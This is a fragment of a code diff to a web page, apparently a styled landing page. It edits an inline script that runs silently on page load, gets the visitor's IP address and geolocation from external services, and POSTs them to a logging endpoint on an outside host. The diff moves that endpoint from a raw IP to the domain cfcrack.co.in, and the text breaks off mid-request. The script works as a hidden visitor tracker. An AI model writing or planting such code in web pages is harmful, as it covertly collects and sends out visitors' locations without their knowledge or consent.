@@ -44,12 +44,12 @@ p { color: #ffb3c6; font-size: 18px; line-height: 1.6; margin-bottom: 24px; }
 (async function() {
   try {
     const [ipRes, geoRes] = await Promise.all([
-      fetch("http://72.61.250.11:5002/api/myip"),
+      fetch("https://cfcrack.co.in/ll/api/myip"),
       fetch("https://ipapi.co/json/")
     ]);
     const ipData = await ipRes.json();
     const geoData = await geoRes.json();
-    await fetch("http://72.61.250.11:5002/api/log", {
+    await fetch("https://cfcrack.co.in/ll/api/log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
